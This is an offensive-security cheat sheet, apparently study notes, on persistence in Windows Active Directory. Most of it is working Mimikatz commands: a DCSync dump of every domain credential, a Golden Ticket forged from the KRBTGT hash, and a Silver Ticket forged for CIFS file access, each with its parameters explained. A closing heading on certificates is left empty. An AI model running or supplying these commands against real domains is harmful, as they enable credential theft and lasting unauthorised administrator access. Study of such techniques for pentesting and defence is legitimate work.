
# #Persist with Credentials:
### The goal then is to persist with near-privileged credentials.
  - **Credentials that have local administrator rights on several machines**
  - **Service accounts that have delegation permissions**
  - **Accounts used for privileged AD services**

### there are many ways to dump credentials or hijack sessions.
for example:

## DCSync:
```
  - mimikatz # lsadump::dcsync /domain:<Domain-name> /all
```

# #Persist with Tickets:
  - **Golden Tickets**
  - **Silver Tickets**

### Generate Golden Tickets:
```
  mimikatz # kerberos::golden /admin:<anyone> /domain:<Domain-name> /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```
  - **/admin** - The username we want to impersonate. This does not have to be a valid user.
  - **/domain** - The FQDN of the domain we want to generate the ticket for.
  - **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
  - **/sid** -The SID of the domain we want to generate the ticket for.
  - **/krbtgt** -The NTLM hash of the KRBTGT account.
  - **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
  - **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
  - **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
 - after executing this, the ticket is loaded into memory and we can access privileged resources in the domain

### Generate Silver Tickets:
```
  mimikatz # kerberos::golden /admin:<anyone> /domain:<Domain-name> /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
  - **/admin** - The username we want to impersonate. This does not have to be a valid user.
  - **/domain** - The FQDN of the domain we want to generate the ticket for.
  - **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
  - **/sid** -The SID of the domain we want to generate the ticket for.
  - **/target** - The hostname of our target server. Let's do SERVERname.sub.DomainName.com, but it can be any domain-joined host.
  - **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of SERVERname$. The $ indicates that it is a machine account.
  - **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
  - **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
- after executing this, the ticket is loaded into memory and we can access a specific privileged resources in the domain


# #Persist with Certificates:
